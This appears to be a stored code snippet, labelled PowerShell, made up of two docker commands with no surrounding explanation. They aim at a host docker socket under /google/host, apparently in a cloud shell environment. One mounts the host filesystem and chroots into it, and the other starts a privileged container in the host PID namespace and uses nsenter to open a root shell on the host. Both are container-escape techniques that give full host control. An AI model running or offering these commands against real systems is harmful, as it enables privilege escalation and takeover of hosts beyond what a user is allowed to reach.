---
id: 2d3bc7a4-b3b0-4151-9902-68ba2f1a5f1b
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:19.469234+00:00'
updated_at: '2023-04-10T20:34:34.758626+00:00'
---

# Code Snippet 2d3bc7a4

**Language**: Powershell

```powershell
sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
